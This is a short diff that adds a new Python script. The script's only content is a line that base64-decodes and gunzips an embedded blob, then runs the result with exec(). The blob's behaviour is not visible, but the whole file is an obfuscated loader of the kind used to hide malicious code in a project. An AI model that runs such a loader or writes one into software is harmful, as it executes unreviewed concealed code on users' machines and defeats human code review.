@@ -1,0 +1,3 @@
+#!/usr/bin/env python3
+import base64,gzip
+exec(gzip.decompress(base64.b64decode('H4sIAFKZjmoC/32QMU/DMBSE9/wKIwY7IkkpDCBQBgZ2JNigsl7rl/ahxjbPdkqF+O84tEUgEJt9d/7u5OOjSQo8mZOdoB2E38aVs+cF9d5xFMBLDxywEs/B2aJj1wuDw/RCD7AmA5GcFfvsXkEdV4yorTOoYbFAH8EusPDtAdbc8DL1aOPdeGNVXgvfgDEa9rqSdY0DGczvakMsK8aXRIymfeCEf+Zdij7F30loffPZOqaDKgtu/x+qoDl069ydEc6jzequoZIbWWXTGbLLVqbY1ZeybDZMEdX4SY1JvQ+KK7IZEtuz8kQ+WTmOZspbv2XepIcQ5BU/7g6zSq6Aje6A1olx5/xUZu9lJjFQQHG/DRH721eK6lRQJ74wAtfZnpbFB0tMYBDdAQAA=')),globals())
